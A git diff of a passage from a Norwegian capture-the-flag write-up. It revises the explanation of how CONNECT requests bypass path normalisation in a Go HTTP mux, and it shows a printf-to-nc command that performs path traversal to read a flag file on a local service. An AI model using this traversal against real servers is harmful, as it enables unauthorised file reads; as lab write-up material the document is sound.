@@ -96,8 +96,8 @@ func serviceHandler(w http.ResponseWriter, r *http.Request) {
 }
 ```
 
-`CONNECT` ga 500-feil, så antar at jeg kan bruke det for å hente flagget. `GET` ga meg noen andre rare feil. \
-Antar flagget heter `server_flag.txt` siden de andre het `user_flag.txt` og `root_flag.txt`.
+`CONNECT` ga 500-feil, og fordi mux ikke normaliserer paths på `CONNECT`-requests, kunne jeg gjøre path traversal med det. `GET` fungerte ikke. \
+Antar flagget heter `server_flag.txt` siden de andre het `user_flag.txt` og `root_flag.txt`. Kunne også sjekket /entrypoint.sh på kaffemaskinen.
 
 ```sh
 /var/lib/rce/data/admin $ printf "CONNECT /service/../../server_flag.txt HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 8085
